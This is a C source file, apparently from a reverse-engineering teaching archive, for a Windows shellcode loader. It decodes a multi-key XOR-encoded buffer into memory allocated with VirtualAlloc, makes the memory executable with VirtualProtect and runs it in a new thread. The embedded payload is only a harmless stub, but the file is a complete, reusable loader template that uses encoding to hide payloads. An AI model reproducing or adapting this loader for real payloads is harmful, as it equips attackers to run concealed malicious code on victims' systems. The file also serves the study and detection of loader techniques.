/*
    Shellcode Loader
    Archive of Reversing.ID

    Custom encoding.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    XOR with multiple key
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

/*
    Encoded shellcode format:
        [N] [S]
        [[Key-1] [Encoded Shellcode-1]] 
        [[Key-2] [Encoded Shellcode-2]]
        ...
        [[Key-N] [Encoded Shellcode-N]]

    Each block will preceeded by a single-byte key.
*/

/*
    buffer: encoded shellcode
*/
size_t calculate (uint8_t * buffer)
{
    uint8_t nblock = buffer[0];
    uint8_t stride = buffer[1];

    // max size
    return nblock * stride; 
}

/*
    dst: buffer which will receive the decoded shellcode
    src: buffer which store encoded shellcode
    size: the size of encoded buffer.
*/
void transform (uint8_t * dst, uint8_t * src, size_t size)
{
    // getting N and S
    uint8_t nblock = src[0];
    uint8_t stride = src[1];
    uint8_t key;

    uint8_t idx_n, idx_s;    
    size_t  idx_dst = 0;

    // skipping N and S.
    uint8_t * ptr_src = &src[2];
    
    for (idx_n = 0; idx_n < nblock; idx_n++)
    {
        key = ptr_src[0];

        for (idx_s = 1; idx_s <= stride; idx_s++)
        {
            dst[idx_dst] = ptr_src[idx_s] ^ key;
            idx_dst++;
        }
        // ptr_src point to next block
        ptr_src = ptr_src + stride + 1;
    }
}

int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stackz
    uint8_t payload []  = { 0x01,0x05,0xf3,0x63,0x63,0x3f,0x30,0x63 };
    size_t  payload_len = calculate(payload);

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decode payload and store to allocated buffer
    transform ((uint8_t*)runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}